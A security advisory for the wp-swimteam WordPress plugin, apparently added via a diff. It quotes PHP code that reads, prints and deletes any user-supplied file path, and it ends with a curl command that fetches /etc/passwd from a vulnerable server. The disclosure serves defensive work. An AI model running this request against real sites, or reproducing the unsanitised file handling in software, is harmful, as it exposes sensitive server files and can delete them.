@@ -1,0 +1,40 @@
+Title: Remote file download vulnerability in Wordpress Plugin wp-swimteam v1.44.10777
+Author: Larry W. Cashdollar, @_larry0
+Date: 2015-07-02
+Download Site: https://wordpress.org/plugins/wp-swimteam
+Vendor: Mike Walsh www.MichaelWalsh.org
+Vendor Notified: 2015-07-02, fixed in v1.45beta3
+Vendor Contact: Through website
+Advisory: http://www.vapid.dhs.org/advisory.php?v=134
+Description: Swim Team (aka wp-SwimTeam) is a comprehensive WordPress plugin to run a swim team including registration, volunteer assignments, scheduling, and much more.
+Vulnerability:
+The code in ./wp-swimteam/include/user/download.php doesn't sanitize user input from downloading sensitive system files:
+
+
+ 50             $file = urldecode($args['file']) ;
+ 51             $fh = fopen($file, 'r') or die('Unable to load file, something bad has happened.') ;
+ 52 
+ 53             while (!feof($fh))
+ 54                 $txt .= fread($fh, 1024) ;
+ 55 
+ 56             //  Clean up the temporary file - permissions
+ 57             //  may prevent this from succeedeing so use the '@'
+ 58             //  to suppress any messages from PHP.
+ 59 
+ 60             @unlink($file) ;
+ 61         }
+ 62 
+ 63         $filename = urldecode($args['filename']) ;
+ 64         $contenttype = urldecode($args['contenttype']) ;
+ 65 
+ 66         // Tell browser to expect a text file of some sort (usually txt or csv)
+ 67 
+ 68         header(sprintf('Content-Type: application/%s', $contenttype)) ;
+ 69         header(sprintf('Content-disposition:  attachment; filename=%s', $filename)) ;
+ 70         print $txt ;
+
+CVEID:
+OSVDB:
+Exploit Code:
+
+  • $ curl "http://server/wp-content/plugins/wp-swimteam/include/user/download.php?file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress"
